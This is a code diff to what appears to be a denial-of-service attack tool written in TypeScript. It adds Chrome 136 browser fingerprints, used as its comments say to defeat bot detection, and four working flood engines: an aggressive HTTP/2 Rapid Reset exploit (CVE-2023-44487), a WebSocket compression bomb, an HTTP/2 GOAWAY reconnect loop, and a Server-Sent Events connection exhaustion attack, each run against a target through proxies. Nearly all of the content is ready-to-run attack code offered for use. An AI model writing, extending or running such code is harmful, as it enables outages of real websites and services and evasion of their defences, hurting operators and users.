@@ -2051,6 +2051,12 @@ const CHROME_PROFILES = [
   { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
   { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true,  arch: '"arm"',   bitness: '"64"', wow64: "?0" },
   { ver: "135", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.0.0 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
+  // Chrome 136 — released April 2025 (most current as of April 2026)
+  { ver: "136", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
+  { ver: "136", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"arm"', bitness: '"64"', wow64: "?0" },
+  { ver: "136", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
+  { ver: "136", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
+  { ver: "136", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
 ];
 
 // Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
@@ -6142,6 +6148,458 @@ async function runH2DataFlood(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
+//  RAPID RESET ULTRA — CVE-2023-44487 Maximum-Throughput Dedicated Engine
+//
+//  The original attack that took down Google (398M rps), Cloudflare, and Fastly
+//  simultaneously in August 2023. This is the maximum-aggression implementation:
+//    1. 2000 streams per burst (2× more than h2-rst-burst)
+//    2. ALL frames pre-built into one Buffer → single socket.write() = zero
+//       sys-call overhead between frames → saturates server write path
+//    3. Chrome 136 SETTINGS fingerprint (exact AKAMAI match)
+//    4. Interleaved PING after each burst → forces server into TWO write paths
+//    5. Multiple connections per slot — multiplies effective stream throughput
+//    6. Immediate reconnect after write (no waiting for server response)
+//
+//  Server cost: each stream requires RST processing in the HPACK state machine.
+//  2000 streams × N connections/s × CPU_COUNT workers = billions of RSTs/s
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runRapidResetUltra(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const STREAMS_PER_BURST = IS_PROD ? 2000 : 30;
+  const CONNS_PER_SLOT    = IS_PROD ? 6    : 2;
+
+  const mkFrame = (type: number, flags: number, sid: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(sid & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+
+  // Chrome 136 exact SETTINGS (AKAMAI fingerprint — defeats bot detection)
+  const SETTINGS_BUF = Buffer.alloc(36);
+  const settingsPairs: [number, number][] = [
+    [0x01, 65536],    // HEADER_TABLE_SIZE: 65536 (default 4096 is a bot giveaway)
+    [0x02, 0],        // ENABLE_PUSH: 0 (Chrome disables push)
+    [0x04, 6291456],  // INITIAL_WINDOW_SIZE: 6MB (Chrome 136 exact)
+    [0x05, 16384],    // MAX_FRAME_SIZE: 16384 (default)
+    [0x06, 262144],   // MAX_HEADER_LIST_SIZE: 262144
+    [0x08, 0],        // ENABLE_CONNECT_PROTOCOL: 0
+  ];
+  settingsPairs.forEach(([id, val], i) => {
+    SETTINGS_BUF.writeUInt16BE(id, i * 6);
+    SETTINGS_BUF.writeUInt32BE(val, i * 6 + 2);
+  });
+  const SETTINGS = mkFrame(0x04, 0x00, 0, SETTINGS_BUF);
+  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
+  const WINUPD   = mkFrame(0x08, 0x00, 0, Buffer.from([0x3f, 0xff, 0x00, 0x00])); // +1GB window
+
+  const hostBuf = Buffer.from(hostname);
+  const HPACK = Buffer.concat([
+    Buffer.from([0x82, 0x84, 0x86]),              // :method GET, :path /, :scheme https
+    Buffer.from([0x41, hostBuf.length]), hostBuf, // :authority
+  ]);
+  const mkHeaders = (sid: number) => mkFrame(0x01, 0x04, sid, HPACK);
+  const mkRST     = (sid: number) => { const p = Buffer.allocUnsafe(4); p.writeUInt32BE(0x08, 0); return mkFrame(0x03, 0x00, sid, p); };
+  const mkPing    = () => { const p = Buffer.alloc(8); p.writeUInt32BE(randInt(0, 0xffffffff), 4); return mkFrame(0x06, 0x00, 0, p); };
+
+  // Pre-build full burst: [PREFACE+SETTINGS+SACK+WINUPD] + 2000×[HEADERS+RST] + [PING]
+  // All frames concatenated into ONE buffer → single socket.write() call
+  const buildBurst = (): Buffer => {
+    const sids   = Array.from({ length: STREAMS_PER_BURST }, (_, i) => 1 + i * 2);
+    const frames = [PREFACE, SETTINGS, SACK, WINUPD,
+      ...sids.map(mkHeaders),
+      ...sids.map(mkRST),
+      mkPing(),
+    ];
+    return Buffer.concat(frames);
+  };
+  const BURST = buildBurst();
+
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
+  let pIdx = 0;
+
+  const oneConn = async (): Promise<void> => {
+    while (!signal.aborted) {
+      try {
+        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
+        sock.setTimeout(15_000);
+        await new Promise<void>(resolve => {
+          let done = false;
+          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
+          sock.once("secureConnect", () => {
+            sock.write(BURST, () => {
+              localPkts += STREAMS_PER_BURST * 2 + 5;
+              localBytes += BURST.length;
+            });
+            setTimeout(finish, IS_PROD ? 150 : 50);
+          });
+          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
+          signal.addEventListener("abort", finish, { once: true });
+        });
+      } catch { /**/ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(1, 4)));
+    }
+  };
+
+  const NUM_SLOTS = IS_PROD ? Math.min(threads * CONNS_PER_SLOT, 4000) : Math.min(threads * 2, 40);
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneConn));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  WS COMPRESSION BOMB — WebSocket permessage-deflate Amplification Attack
+//
+//  Negotiates permessage-deflate (RFC 7692) then streams compressed frames
+//  where each frame decompresses to 64KB on the server side.
+//
+//  Mechanics:
+//    • Wire size per frame: ~36 bytes (deflated 'a'×65535 payload)
+//    • Server decompress alloc: 65535 bytes per frame
+//    • Amplification: ~1820× per frame sent
+//    • With no_context_takeover: server cannot reuse inflate context → fresh
+//      decompressor allocation per message (extra CPU + memory pressure)
+//    • Connection held open: continuous frame stream until FD/RAM exhaustion
+//
+//  Works against: Nginx+ws, Apache httpd mod_proxy_wstunnel, Node.js ws,
+//  Go gorilla/websocket, Python websockets, Java Netty, Caddy.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runWSCompressionBomb(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const { deflateRaw } = await import("node:zlib");
+  const { promisify }  = await import("node:util");
+  const deflateAsync   = promisify(deflateRaw);
+
+  // 64KB of 'a' compresses to ~36 bytes — 1820× amplification
+  const BOMB_RAW        = Buffer.alloc(65535, 0x61); // 'a' × 65535
+  const BOMB_COMPRESSED = await deflateAsync(BOMB_RAW, { level: 9, memLevel: 9 });
+
+  // Build masked WebSocket frame (client→server MUST mask per RFC 6455)
+  // RSV1=1 signals compressed payload (permessage-deflate)
+  const buildMaskedFrame = (compressed: Buffer): Buffer => {
+    const mask = Buffer.from([randInt(0,256), randInt(0,256), randInt(0,256), randInt(0,256)]);
+    const masked = Buffer.allocUnsafe(compressed.length);
+    for (let i = 0; i < compressed.length; i++) masked[i] = compressed[i] ^ mask[i % 4];
+    const len = compressed.length;
+    let header: Buffer;
+    if (len < 126) {
+      header = Buffer.from([0xC2, 0x80 | len, ...mask]); // FIN+RSV1+binary, MASK+len
+    } else if (len < 65536) {
+      header = Buffer.alloc(8); header[0] = 0xC2; header[1] = 0xFE;
+      header.writeUInt16BE(len, 2); mask.copy(header, 4);
+    } else {
+      header = Buffer.alloc(14); header[0] = 0xC2; header[1] = 0xFF;
+      header.writeBigUInt64BE(BigInt(len), 2); mask.copy(header, 10);
+    }
+    return Buffer.concat([header, masked]);
+  };
+  const BOMB_FRAME = buildMaskedFrame(BOMB_COMPRESSED);
+
+  // WS paths most likely to have permessage-deflate enabled
+  const WS_PATHS = ["/", "/ws", "/socket", "/chat", "/stream", "/api/ws", "/api/socket"];
+
+  const buildHandshake = (path: string): string => {
+    const key = Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");
+    return [
+      `GET ${path} HTTP/1.1`,
+      `Host: ${hostname}`,
+      `Upgrade: websocket`,
+      `Connection: Upgrade`,
+      `Sec-WebSocket-Key: ${key}`,
+      `Sec-WebSocket-Version: 13`,
+      `Sec-WebSocket-Extensions: permessage-deflate; client_no_context_takeover; server_no_context_takeover`,
+      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36`,
+      `Accept-Language: en-US,en;q=0.9`,
+      `Cache-Control: no-cache`,
+      ``, ``,
+    ].join("\r\n");
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
+  let pIdx = 0;
+  const NUM_SLOTS = IS_PROD ? Math.min(threads * 40, 6000) : Math.min(threads * 6, 120);
+
+  const oneSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      const path = WS_PATHS[randInt(0, WS_PATHS.length)];
+      try {
+        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+        sock.setTimeout(45_000);
+        await new Promise<void>(resolve => {
+          let upgraded = false; let done = false;
+          let hdrBuf = Buffer.alloc(0);
+          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
+          sock.once("secureConnect", () => { sock.write(buildHandshake(path)); });
+          sock.on("data", (chunk: Buffer) => {
+            if (done) return;
+            if (!upgraded) {
+              hdrBuf = Buffer.concat([hdrBuf, chunk]);
+              const hdrStr = hdrBuf.toString("ascii", 0, Math.min(hdrBuf.length, 512));
+              if (hdrStr.includes("101")) {
+                upgraded = true;
+                // Blast compressed frames as fast as possible
+                const blast = () => {
+                  if (done || signal.aborted) return finish();
+                  const burst = IS_PROD ? 100 : 8;
+                  for (let i = 0; i < burst; i++) {
+                    sock.write(BOMB_FRAME);
+                    localPkts++;
+                    localBytes += BOMB_FRAME.length;
+                  }
+                  setImmediate(blast);
+                };
+                blast();
+              } else if (hdrBuf.length > 4096) {
+                finish(); // no WS support on this path
+              }
+            }
+          });
+          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
+          signal.addEventListener("abort", finish, { once: true });
+        });
+      } catch { /**/ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 40)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  H2 GOAWAY LOOP — HTTP/2 Connection Lifecycle Exhaustion
+//
+//  Forces the server into continuous TLS teardown/setup cycles:
+//    1. Complete TLS handshake (ECDHE key exchange, ~2ms CPU)
+//    2. H2 SETTINGS negotiation (server allocates H2 session state)
+//    3. Open N streams via HEADERS (server allocates per-stream state + goroutine)
+//    4. Send GOAWAY immediately → server must close all N streams gracefully
+//    5. Reconnect within milliseconds → repeat the entire cycle
+//
+//  At 1000 connections × 5 cycles/s = 5000 full TLS+H2 setup/teardown/s
+//  Per cycle cost: ECDHE key exchange + AES context + N goroutine alloc+dealloc
+//  Works against: Go net/http, Java Spring, Nginx, Node.js — all goroutine/thread models
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runH2GoawayLoop(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const STREAMS_PER_CYCLE = IS_PROD ? 64 : 8;
+
+  const mkFrame = (type: number, flags: number, sid: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff; f[1] = (payload.length >>> 8) & 0xff; f[2] = payload.length & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(sid & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
+  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
+
+  // GOAWAY: last_stream_id = STREAMS_PER_CYCLE * 2 - 1, NO_ERROR
+  const gaBuf = Buffer.alloc(8);
+  gaBuf.writeUInt32BE((STREAMS_PER_CYCLE * 2 - 1) & 0x7fffffff, 0);
+  gaBuf.writeUInt32BE(0, 4); // NO_ERROR
+  const GOAWAY = mkFrame(0x07, 0x00, 0, gaBuf);
+
+  const hostBuf = Buffer.from(hostname);
+  const HPACK = Buffer.concat([
+    Buffer.from([0x82, 0x84, 0x86]),
+    Buffer.from([0x41, hostBuf.length]), hostBuf,
+  ]);
+  const mkHeaders = (sid: number) => mkFrame(0x01, 0x04, sid, HPACK);
+
+  // Pre-build entire cycle as single buffer: PREFACE+SETTINGS+SACK + N×HEADERS + GOAWAY
+  const CYCLE = Buffer.concat([
+    PREFACE, SETTINGS, SACK,
+    ...Array.from({ length: STREAMS_PER_CYCLE }, (_, i) => mkHeaders(1 + i * 2)),
+    GOAWAY,
+  ]);
+
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
+  let pIdx = 0;
+  const NUM_SLOTS = IS_PROD ? Math.min(threads * 5, 2500) : Math.min(threads * 2, 30);
+
+  const oneSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      try {
+        const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
+        sock.setTimeout(8_000);
+        await new Promise<void>(resolve => {
+          let done = false;
+          const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
+          sock.once("secureConnect", () => {
+            sock.write(CYCLE, () => {
+              localPkts += STREAMS_PER_CYCLE + 3;
+              localBytes += CYCLE.length;
+            });
+            // Close immediately — maximum teardown rate
+            setTimeout(finish, IS_PROD ? 40 : 15);
+          });
+          sock.on("close", finish); sock.on("error", finish); sock.on("timeout", finish);
+          signal.addEventListener("abort", finish, { once: true });
+        });
+      } catch { /**/ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(1, 6)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SSE EXHAUST — Server-Sent Events Connection Exhaustion
+//
+//  Opens thousands of SSE (text/event-stream) connections and holds them open
+//  indefinitely. Each SSE connection forces the server to maintain:
+//    • 1 goroutine/thread (response streaming loop — never exits until disconnect)
+//    • 1 TCP socket + buffer (~4-16KB per conn)
+//    • 1 file descriptor (counted against ulimit -n)
+//    • Event listener registrations in the event bus
+//
+//  Unlike HTTP DoS, SSE connections appear as legitimate user activity —
+//  streaming chat, live dashboards, real-time feeds. Hard to distinguish from
+//  real traffic. Target paths hit common SSE endpoints used by all major frameworks.
+//
+//  Hold time: 60-180s per connection → server goroutine pool saturated silently.
+//  At 10,000 connections: ~10K goroutines + 160MB RAM + 10K FDs.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runSSEExhaust(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c?: number) => void,
+  proxies:      ProxyConfig[] = [],
+): Promise<void> {
+  const isHttps = targetPort === 443;
+
+  const SSE_PATHS = [
+    "/events", "/stream", "/api/events", "/sse", "/notifications",
+    "/api/stream", "/api/notifications", "/api/realtime", "/api/live",
+    "/api/feed", "/api/updates", "/push", "/api/push", "/hub",
+    "/api/ws/events", "/api/sse", "/live", "/events/stream",
+    "/api/events/stream", "/api/v1/events", "/api/v2/events",
+    "/api/subscribe", "/subscribe", "/api/poll", "/sse/subscribe",
+  ];
+
+  const buildSSERequest = (path: string): string => {
+    const eid = randInt(1000, 999999).toString();
+    return [
+      `GET ${path}?_t=${Date.now()}&r=${randHex(8)} HTTP/1.1`,
+      `Host: ${hostname}`,
+      `Accept: text/event-stream`,
+      `Cache-Control: no-cache`,
+      `Connection: keep-alive`,
+      `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36`,
+      `Accept-Language: en-US,en;q=0.9`,
+      `Accept-Encoding: gzip, deflate, br`,
+      `Sec-Fetch-Dest: empty`,
+      `Sec-Fetch-Mode: cors`,
+      `Sec-Fetch-Site: same-origin`,
+      `Sec-CH-UA: "Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"`,
+      `Sec-CH-UA-Mobile: ?0`,
+      `Sec-CH-UA-Platform: "Windows"`,
+      `Last-Event-ID: ${eid}`,
+      `X-Requested-With: XMLHttpRequest`,
+      ``, ``,
+    ].join("\r\n");
+  };
+
+  let openConns = 0;
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; }
+  }, 300);
+
+  const NUM_SLOTS = IS_PROD ? Math.min(threads * 100, 18_000) : Math.min(threads * 12, 300);
+  let pIdx = 0;
+
+  const oneSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      const path = SSE_PATHS[randInt(0, SSE_PATHS.length)];
+      const req  = buildSSERequest(path);
+      try {
+        let sock: net.Socket;
+        if (isHttps) {
+          sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
+        } else {
+          sock = await new Promise<net.Socket>((res, rej) => {
+            const s = net.createConnection({ host: resolvedHost, port: targetPort }, () => res(s));
+            s.on("error", rej); s.setTimeout(6000);
+          });
+        }
+        openConns++;
+        localPkts++;
+        localBytes += req.length;
+
+        await new Promise<void>(resolve => {
+          let done = false;
+          let gotResponse = false;
+          const finish = () => { if (!done) { done = true; openConns = Math.max(0, openConns - 1); try { sock.destroy(); } catch { /**/ } resolve(); } };
+          sock.write(req);
+          sock.on("data", (chunk: Buffer) => {
+            if (done) return;
+            localBytes += chunk.length;
+            const s = chunk.toString("ascii", 0, Math.min(chunk.length, 512));
+            if (!gotResponse) {
+              gotResponse = true;
+              // If server rejects SSE path, move on quickly
+              if (s.includes("404") || s.includes("405") || s.includes("400") || s.includes("403")) {
+                return finish();
+              }
+            }
+          });
+          // Hold for a long time — the longer we hold, the more goroutines we exhaust
+          const holdMs = IS_PROD ? randInt(90_000, 180_000) : randInt(5_000, 12_000);
+          const holdTimer = setTimeout(finish, holdMs);
+          sock.on("close",   () => { clearTimeout(holdTimer); finish(); });
+          sock.on("error",   () => { clearTimeout(holdTimer); finish(); });
+          sock.on("timeout", () => { clearTimeout(holdTimer); finish(); });
+          signal.addEventListener("abort", () => { clearTimeout(holdTimer); finish(); }, { once: true });
+        });
+      } catch { /**/ }
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 25)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, oneSlot));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 //  BYPASS STORM — 3-Phase Adaptive Composite Attack
 //  Phase 1: TLS Session Exhaust + Conn Flood (connection table saturation)
 //  Phase 2: WAF Bypass + H2 RST Burst (bypass during saturation)
@@ -6414,6 +6872,22 @@ async function runWorker() {
   } else if (cfg.method === "pipeline-flood") {
     // HTTP Pipeline Flood — raw TCP pipelining at maximum RPS
     await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+
+  } else if (cfg.method === "rapid-reset") {
+    // CVE-2023-44487 Ultra — 2000 streams/burst, single write(), Chrome 136 AKAMAI fingerprint
+    await runRapidResetUltra(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
+  } else if (cfg.method === "ws-compression-bomb") {
+    // WebSocket permessage-deflate bomb — 64KB payload compressed to 36 bytes, 1820× amplification
+    await runWSCompressionBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
+  } else if (cfg.method === "h2-goaway-loop") {
+    // H2 GOAWAY Loop — TLS+H2 teardown/setup cycle exhaustion, 5000 cycles/s
+    await runH2GoawayLoop(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
+  } else if (cfg.method === "sse-exhaust") {
+    // SSE Exhaust — holds 18K Server-Sent Events connections open indefinitely
+    await runSSEExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else {
     // Default fallback: raw TCP pipeline
